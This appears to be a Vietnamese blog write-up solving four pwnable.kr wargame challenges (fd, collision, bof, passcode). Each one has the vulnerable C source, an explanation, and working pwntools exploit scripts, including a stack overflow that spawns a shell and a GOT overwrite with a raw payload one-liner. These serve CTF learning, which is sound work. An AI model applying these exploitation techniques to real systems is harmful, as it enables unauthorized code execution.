---
title: PWNABLE.KR - Phần 1
tag: ['PWN', 'Writeup']
date: 2026-02-02 21:41:01
cover: /img/post/writeup/pwnable-kr/thumbnail.png
category: ['Writeup']
author:
    - Vuk3r
---
Đây là series try hard giải các challenge trên trang web [pwnable.kr](http://pwnable.kr). Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :>

# fd

## Description

```c
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

## Solution

Khi gọi hàm read, chương trình truyền vào tham số đầu tiên là `fd` với `fd` được tính theo công thức  `atoi( argv[1] ) - 0x1234` và argv[1] có nghĩa là tham số đầu tiên khi bạn gọi file ( ví dụ như `./fd 123`)

Và nếu như `read` thực thi thành công thì sẽ yêu cầu bạn nhập input và lưu vào biến `buf`, sau đó đem đi so sánh với chuỗi   `LETMEWIN\n` là đọc được flag.

tìm hiểu `fd` thì mình biết được rằng đó là chỉ số `file description`, với đầu vào là input từ bàn phím thì ta cần nó là `fd` của `STDIN` tương đương với `0`, `argv[1]` sẽ được `atoi()` chuyển về số nguyên và đem trừ với `0x1234` thì ta chỉ cần gọi file với tham số đầu là `4660` là được.

## Payload

```c
from pwn import *
import sys

### USING : python3 solve.py fd

p = ssh(
    user=sys.argv[1],
    host='pwnable.kr',
    port=2222,
    password='guest',
)
sh = p.shell()

fd_minus = 0x1234
sh.sendline(f'./fd {fd_minus}')
sh.send('LETMEWIN\n')

sh.interactive()  
```

# Collision

## Description

```c
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){ 
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

## Solution

Bài này yêu cầu đầu vào dài 20 byte. Sau đó làm gì đó với input của mình rồi mới đem so với biến `hashcode`. Hàm `check_password()` nhận vào 1 chuỗi dài 20 byte, sau đó gọi 1 con trỏ int để trỏ tới 4 kí tự 1 lần. 

Ví dụ mình nhập `aaaabbbbccccddddeeee` thì con trỏ đầu tiên sẽ trỏ tới địa chỉ mang giá trị `0x4141414141` rồi cộng số đó vào biến `res`. Nôm na thì là chuỗi dài 20 kí tự, lấy hex của 4 kí tự đầu ra, cộng vào `res`, tới 4 kí  tự tiếp theo và làm hành động đó tổng là 5 lần. Vậy thì ta chỉ cần lấy biến `hashcode` chia ra làm 4 phần bằng nhau và cộng với phần còn lại, ghép 5 phần thành 1 chuỗi thì ta sẽ thu được 1 chuỗi khi đi qua hàm `check_password()` sẽ trả về giá trị bằng với `hashcode`. Mình không chia cho 5 vì khi lấy chuỗi `0x21DD09EC/5`thì mình thấy dư nên sẽ chia 4, vừa tròn đẹp :>

## Payload

Để cho tiện thì mình in chuỗi đó ra rồi thêm trực tiếp vào chương trình bằng thủ công :

```c
hashcode = 0x21DD09EC
chunk = int(hashcode/5)
final_chunk = hashcode-chunk*4
payload = p32(chunk)*4 + p32(final_chunk)
print(repr(payload))

# output : b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
# usage  : ./col $'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

# Bof

## Description

```c
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

ssh bof@pwnable.kr -p2222 (pw: guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Solution

Với biến `overflowme` được khai báo là 32 byte nhưng gọi tới hàm `gets()` - một hàm nhập không có điểm dừng :v Nên chỉ cần mình khi tràn xuống biến `key` ở dưới là được. Chương trình được cho là `x86` có nghĩa là tham số `key` sẽ nằm trên stack khi được khai báo và địa chỉ sẽ nằm cao hơn địa chỉ của biến local của hàm `func` ⇒ Biến `overflowme` có thể thay đổi giá trị của biến `key` khi ghi tràn.

## Payload

```c
from pwn import *
import sys

### USING : python3 solve.py bof

p = ssh(
    user=sys.argv[1],
    host='pwnable.kr',
    port=2222,
    password='guest',
)
sh = p.shell()

sh.sendline(b'nc 0 9000')

payload = b'a'*52
payload += p32(0xcafebabe)
sh.sendline(payload)

#cat flag

sh.interactive()
```

# Passcode

## Description

```c
Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

### Checksec

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

## Solution

Chạy chương trình và nhập vào biến thứ 2 thì gặp lỗi Segment fault nên phân tích code thì rõ là đoạn code đã code sai đoạn input `passcode1` và `passcode2` là thay vì truyền vào địa chỉ của 2 biến thì lại truyền vào giá trị, có nghĩa là khi chạy thì nó sẽ lấy giá trị nào nó trên thanh stack để nhập vào. Điều hay là chương trình vô tình nhập được vào `passcode1` (author setup :v). Việc nhập vào được vẫn là khả thi nếu như giá trị được trỏ tới là một địa chỉ hợp lệ (một địa chỉ đang tồn tại trong chương trình và có quyền ghi). Và khi debug sẽ thấy `passcode1` được nhận 1 địa chỉ hợp lệ, `passcode2` nhận một địa chỉ rác (nó là `canary` nhưng ta không cần quan tâm, sự xuất hiện của nó giúp mình nhìn thấy được các giá trị khác). Và khi debug hàm `welcome` sẽ thấy 2 giá trị này cũng tồn tại trên stack khi chương tình bảo nhập tên. Thực tế thì 2 giá trị đó đều là giá trị của thanh stack cũ. 

Nhập  95 kí tự vào name và kiểm tra trạng  thái stack sẽ thấy được 1 địa chỉ hợp lệ và 1 giá trị hợp lệ khi gọi hàm `welcome` và nhập tên (ảnh 1)

![image.png](/img/post/writeup/pwnable-kr/series-1/1.png)

                         Trạng thái stack của hàm welcome khi nhập 95 kí tự

Khi đó debug cũng sẽ thấy các giá trị này được gọi tới như tham số thứ 2 của hàm `scanf` 


![image.png](/img/post/writeup/pwnable-kr/series-1/2.png)

                        Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode1

![image.png](/img/post/writeup/pwnable-kr/series-1/3.png)

                        Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode2

Nhập tên dài hơn 4 kí tự sẽ khi đè địa chỉ đó, vậy có nghĩa là ta có thể điều khiển địa chỉ nhập vào của `passcode1`. Vì không có bảo vệ RELRO và địa chỉ PIE tĩnh nên ta sẽ tấn công địa chỉ GOT của 1 hàm nào sau đó khi nhập xong passcode1. Mình chọn hàm  `fflush` là mục tiêu vì là chọn hàm gần nhất thì giảm rủi ro chương trình bị lỗi.

### Solution

```c
from pwn import *
import sys

# usage: python3 solve.py passcode

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

fflush_got = 0x0804c030
login_168 = 0x0804929e #win
name = b'a'*96 + p32(fflush_got)

p.sendline(name)
p.sendline(str(login_168))
p.interactive()
```

Đây là chương trình khai thác local và đã thành công. Riêng trên remote thì mình tà đạo 1 chút (vì nó lỗi hoài T~T ) 

```c
python -c 'import sys; sys.stdout.buffer.write(b"\x41"*96 + b"\x14\xc0\x04\x08" + b"134517391")' | ./passcode

```

Mỗi series mình nghĩ làm 4 câu là vừa :v Người viết dễ viết, người đọc dễ tìm. Mong nó giúp ích cho các bạn. Nếu có thắc mắc gì thì bạn có thể liên hệ trực tiếp cho mình :> Have a good pwn.